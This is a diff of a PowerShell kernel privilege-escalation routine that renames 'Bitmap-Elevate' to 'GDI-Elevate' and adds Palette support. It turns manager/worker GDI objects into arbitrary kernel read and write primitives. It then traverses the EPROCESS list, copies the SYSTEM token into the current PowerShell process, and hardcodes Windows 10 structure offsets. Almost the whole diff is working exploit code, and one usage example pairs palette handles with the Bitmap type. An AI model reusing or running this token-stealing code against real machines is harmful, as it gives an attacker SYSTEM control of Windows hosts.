@@ -1,7 +1,8 @@
-function Bitmap-Elevate {
+function GDI-Elevate {
 <#
 .SYNOPSIS
-	A token stealing wrapper for x32/64 which ingests a handle to a manager and worker bitmap.
+	A token stealing wrapper for x32/64 which ingests a handle to a manager and worker
+	GDI object (Bitmap/Palette).
 
 	Note that this function has two methods, if supplied with a pointer to an arbitrary
 	tagTHREADINFO object it can elevate the current process from low integrity. Without the
@@ -14,27 +15,36 @@ function Bitmap-Elevate {
 	Required Dependencies: None
 	Optional Dependencies: None
 
-.PARAMETER ManagerBitmap
-	Handle to manager bitmap.
+.PARAMETER GDIManager
+	Handle to manager GDI object.
 
-.PARAMETER WorkerBitmap
-	Handle to worker bitmap.
+.PARAMETER GDIWorker
+	Handle to worker GDI object.
+
+.PARAMETER GDIType
+	Bitmap or Palette.
 
 .PARAMETER ThreadInfo
 	Optional pointer to tagTHREADINFO (Int64/Int32).
 
 .EXAMPLE
 	# MedIL token theft
-	C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle
+	C:\PS> GDI-Elevate -GDIManager $ManagerBitmap.BitmapHandle -GDIWorker $WorkerBitmap.BitmapHandle -GDIType Bitmap
 
 	# LowIL token theft
-	C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -ThreadInfo $ManagerBitmap.tagTHREADINFO
+	C:\PS> GDI-Elevate -GDIManager $ManagerPalette.PaletteHandle -GDIWorker $WorkerPalette.PaletteHandle -GDIType Bitmap -ThreadInfo $ManagerPalette.tagTHREADINFO
 #>
 	param(
 		[Parameter(Mandatory = $True)]
-		[IntPtr]$ManagerBitmap,
+		[IntPtr]$GDIManager,
 		[Parameter(Mandatory = $True)]
-		[IntPtr]$WorkerBitmap,
+		[IntPtr]$GDIWorker,
+		[Parameter(Mandatory = $True)]
+		[ValidateSet(
+			'Bitmap',
+			'Palette')
+		]
+		[String]$GDIType,
 		[Parameter(Mandatory = $False)]
 		$ThreadInfo
 	)
@@ -56,6 +66,18 @@ function Bitmap-Elevate {
 			IntPtr hbmp,
 			int cbBuffer,
 			IntPtr lpvBits);
+		[DllImport("gdi32.dll")]
+		public static extern int SetPaletteEntries(
+			IntPtr hpal,
+			uint iStart,
+			uint cEntries,
+			byte[] lppe);
+		[DllImport("gdi32.dll")]
+		public static extern int GetPaletteEntries(
+			IntPtr hpal,
+			uint iStartIndex,
+			uint nEntries,
+			IntPtr lppe);
 		[DllImport("kernel32.dll", SetLastError = true)]
 		public static extern IntPtr VirtualAlloc(
 			IntPtr lpAddress,
@@ -85,46 +107,69 @@ function Bitmap-Elevate {
 		$x32Architecture = 1
 	}
 
-	# Arbitrary Kernel read
-	function Bitmap-Read {
-		param ($Address)
-		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
-		[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
-		$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
-		if ($x32Architecture){
-			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
-		} else {
-			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
+	if ($GDIType -eq "Bitmap") {
+		# Arbitrary bitmap Kernel read
+		function GDI-Read {
+			param ($Address)
+			$CallResult = [BitmapElevate]::SetBitmapBits($GDIManager, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
+			[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
+			$CallResult = [BitmapElevate]::GetBitmapBits($GDIWorker, [System.IntPtr]::Size, $Pointer)
+			if ($x32Architecture){
+				[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
+			} else {
+				[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
+			}
+			$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
 		}
-		$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
-	}
-	
-	# Arbitrary Kernel write
-	function Bitmap-Write {
-		param ($Address, $Value)
-		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
-		$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
+		
+		# Arbitrary bitmap Kernel write
+		function GDI-Write {
+			param ($Address, $Value)
+			$CallResult = [BitmapElevate]::SetBitmapBits($GDIManager, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
+			$CallResult = [BitmapElevate]::SetBitmapBits($GDIWorker, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
+		}
+	} else {
+		# Arbitrary palette Kernel read
+		function GDI-Read {
+			param ($Address)
+			$CallResult = [BitmapElevate]::SetPaletteEntries($GDIManager, 0, $([System.IntPtr]::Size/4), [System.BitConverter]::GetBytes($Address))
+			[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
+			$CallResult = [BitmapElevate]::GetPaletteEntries($GDIWorker, 0, $([System.IntPtr]::Size/4), $Pointer)
+			if ($x32Architecture){
+				[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
+			} else {
+				[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
+			}
+			$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
+		}
+		
+		# Arbitrary palette Kernel write
+		function GDI-Write {
+			param ($Address, $Value)
+			$CallResult = [BitmapElevate]::SetPaletteEntries($GDIManager, 0, $([System.IntPtr]::Size/4), [System.BitConverter]::GetBytes($Address))
+			$CallResult = [BitmapElevate]::SetPaletteEntries($GDIWorker, 0, $([System.IntPtr]::Size/4), [System.BitConverter]::GetBytes($Value))
+		}
 	}
 
 	# Parse EPROCESS list
 	function Traverse-EPROCESS {
 		param($EPROCESS,$TargetPID)
 		echo "[+] Traversing ActiveProcessLinks list"
-		$NextProcess = $(Bitmap-Read -Address $($EPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+		$NextProcess = $(GDI-Read -Address $($EPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
 		while($true) {
-			$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
+			$NextPID = GDI-Read -Address $($NextProcess+$UniqueProcessIdOffset)
 			if ($NextPID -eq $TargetPID) {
 				echo "[+] PID: $NextPID"
 				echo "[+] Token Address: 0x$("{0:X}" -f $($NextProcess+$TokenOffset))"
-				echo "[+] Token Value: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
+				echo "[+] Token Value: 0x$("{0:X}" -f $(GDI-Read -Address $($NextProcess+$TokenOffset)))"
 				$HashTable = @{
 					TokenAddress = $NextProcess+$TokenOffset
-					TokenValue = Bitmap-Read -Address $($NextProcess+$TokenOffset)
+					TokenValue = GDI-Read -Address $($NextProcess+$TokenOffset)
 				}
 				$Script:TokenObject = New-Object PSObject -Property $HashTable
 				break
 			}
-			$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+			$NextProcess = $(GDI-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
 		}
 	}
 	
@@ -134,28 +179,29 @@ function Bitmap-Elevate {
 	{
 		'10.0' # Win10 / 2k16
 		{
-			if(!$x32Architecture){
-				if($OSVersion.Build -lt 15063){
+			if($OSVersion.Build -ge 15063){
+				if (!$x32Architecture) {
+					$KthreadEprocess = 0x220
+					$UniqueProcessIdOffset = 0x2e0
+					$TokenOffset = 0x358          
+					$ActiveProcessLinks = 0x2e8
+				} else {
+					$KthreadEprocess = 0x150
+					$UniqueProcessIdOffset = 0xb4
+					$TokenOffset = 0xfc          
+					$ActiveProcessLinks = 0xb8
+				}
+			}
+			if($OSVersion.Build -lt 15063){
+				if (!$x32Architecture) {
 					$KthreadEprocess = 0x220
 					$UniqueProcessIdOffset = 0x2e8
 					$TokenOffset = 0x358          
 					$ActiveProcessLinks = 0x2f0
 				} else {
-					$KthreadEprocess = 0x220
-					$UniqueProcessIdOffset = 0x2e0
-					$TokenOffset = 0x358          
-					$ActiveProcessLinks = 0x2e8
-				}
-			} else {
-				if($OSVersion.Build -lt 15063){
 					$KthreadEprocess = 0x150
 					$UniqueProcessIdOffset = 0xb4
 					$TokenOffset = 0xf4          
-					$ActiveProcessLinks = 0xb8
-				} else {
-					$KthreadEprocess = 0x150
-					$UniqueProcessIdOffset = 0xb4
-					$TokenOffset = 0xfc          
 					$ActiveProcessLinks = 0xb8
 				}
 			}
@@ -210,15 +256,15 @@ function Bitmap-Elevate {
 	if ($ThreadInfo) {
 		echo "`n[>] LowIL compatible leak!"
 		echo "[+] tagTHREADINFO 0x$("{0:X}" -f $ThreadInfo)"
-		$Kthread = Bitmap-Read -Address $ThreadInfo
+		$Kthread = GDI-Read -Address $ThreadInfo
 		echo "[+] KTHREAD: 0x$("{0:X}" -f $Kthread)"
-		$Eprocess = Bitmap-Read -Address $($Kthread+$KthreadEprocess)
+		$Eprocess = GDI-Read -Address $($Kthread+$KthreadEprocess)
 		echo "[+] PowerShell _EPROCESS: 0x$("{0:X}" -f $Eprocess)"
 		$PoShTokenAddr = $Eprocess+$TokenOffset
 		echo "`n[>] Leaking SYSTEM _EPROCESS.."
 		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID 4
 		echo "`n[!] Duplicating SYSTEM token!`n"
-		Bitmap-Write -Address $PoShTokenAddr -Value $TokenObject.TokenValue
+		GDI-Write -Address $PoShTokenAddr -Value $TokenObject.TokenValue
 	} else {
 		echo "`n[>] MediumIL compatible leak!"
 		$SystemModuleArray = Get-LoadedModules
@@ -230,12 +276,12 @@ function Bitmap-Elevate {
 		$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
 		echo "[+] PsInitialSystemProcess: 0x$("{0:X}" -f $SysEprocessPtr)"
 		$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
-		$Eprocess = Bitmap-Read -Address $SysEprocessPtr
-		echo "[+] SYSTEM _EPROCESS: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
-		$SysToken = Bitmap-Read -Address $($Eprocess+$TokenOffset)
+		$Eprocess = GDI-Read -Address $SysEprocessPtr
+		echo "[+] SYSTEM _EPROCESS: 0x$("{0:X}" -f $(GDI-Read -Address $SysEprocessPtr))"
+		$SysToken = GDI-Read -Address $($Eprocess+$TokenOffset)
 		echo "`n[>] Leaking PowerShell _EPROCESS.."
 		Traverse-EPROCESS -EPROCESS $Eprocess -TargetPID $PID
 		echo "`n[!] Duplicating SYSTEM token!`n"
-		Bitmap-Write -Address $TokenObject.TokenAddress -Value $SysToken
+		GDI-Write -Address $TokenObject.TokenAddress -Value $SysToken
 	}
 }
